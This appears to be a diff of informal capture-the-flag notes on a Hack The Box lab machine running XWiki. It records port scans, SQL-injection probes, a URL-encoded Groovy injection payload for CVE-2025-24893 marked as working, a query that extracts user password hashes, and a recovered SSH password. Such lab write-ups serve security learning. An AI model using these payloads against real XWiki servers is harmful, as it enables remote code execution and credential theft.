@@ -1,12 +1,12 @@
 ___
 
 
+# User
 
 *ports open*
 22
 80
 8080
-
 
 
 8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
@@ -23,7 +23,6 @@ http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async%2
 http://10.10.11.80:8080/xwiki/rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=injected
 
 
-
 Exception while executing query. Query statement = [SELECT ddoc.id FROM XWikiDeletedDocument as ddoc WHERE 1=1 order by SHOW TABLES; asc]
 
 
@@ -32,7 +31,6 @@ Exception while executing query. Query statement = [SELECT ddoc.id FROM XWikiDel
 https://github.com/advisories/GHSA-rr6p-3pfg-562j
 
 `<host>/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28"Hello%20from"%20%2B%20"%20search%20text%3A"%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20`
-
 
 
 # this one worked
@@ -56,12 +54,11 @@ https://github.com/gunzf0x/CVE-2025-24893
 | --------------------- | ------------ |
 | 8                     |              |
 |                       |              |
+|                       |              |
 
-*chat pulled in clutch rn bc wtf*
+*chat pulled in clutch rn bc what*
 
 SELECT username, password_hash FROM ((SELECT d.XWD_FULLNAME AS username, s.XWS_VALUE AS password_hash FROM xwikiobjects o JOIN xwikiproperties p ON o.XWO_ID = p.XWP_ID JOIN xwikistrings s ON p.XWP_ID = s.XWS_ID JOIN xwikidoc d ON d.XWD_FULLNAME = o.XWO_NAME WHERE o.XWO_CLASSNAME = 'XWiki.XWikiUsers' AND p.XWP_NAME = 'password' AND p.XWP_CLASSTYPE = 'com.xpn.xwiki.objects.StringProperty') UNION ALL (SELECT d.XWD_FULLNAME AS username, xl.XWL_VALUE AS password_hash FROM xwikiobjects o JOIN xwikiproperties p ON o.XWO_ID = p.XWP_ID JOIN xwikilargestrings xl ON xl.XWL_ID = p.XWP_ID JOIN xwikidoc d ON d.XWD_FULLNAME = o.XWO_NAME WHERE o.XWO_CLASSNAME = 'XWiki.XWikiUsers' AND p.XWP_NAME = 'password' AND p.XWP_CLASSTYPE LIKE '%LargeStringProperty%')) t ORDER BY username;
-
-
 
 
 
@@ -75,15 +72,12 @@ SELECT username, password_hash FROM ((SELECT d.XWD_FULLNAME AS username, s.XWS_V
 | XWiki.neal | neal@editor.htb                                                                                                                         
 
 
-
-
 *this was the password for oliver on ssh brughhhhhh*
 theEd1t0rTeam99
 
 
 *is this it?*
 Netdata Agent: v1.45.2
-
 
 
 *this is it*
